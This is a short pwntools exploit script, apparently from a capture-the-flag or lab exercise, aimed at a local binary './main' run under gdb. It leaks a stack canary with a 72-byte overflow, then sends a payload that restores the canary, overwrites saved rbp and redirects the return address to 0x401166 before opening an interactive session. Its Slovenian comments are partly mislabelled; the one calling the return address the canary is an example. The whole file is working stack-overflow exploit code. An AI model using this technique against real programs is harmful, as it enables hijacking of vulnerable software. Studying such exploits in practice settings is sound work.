from pwn import *
p = gdb.debug('./main', 'b * main')
p.sendline(b'A' * 72)
p.recvline()
leak = p.recvline()
leak = u64(b"\x00" +  leak[:7])
print("Canary: ", hex(leak))

payload = b'A' * 72
payload += p64(leak) #zacetni povoz bufferja
payload += b'B' * 8 #s tem povozimo rbp
payload += p64(0x0000000000401166) #canary
p.sendline(payload)

p.interactive()
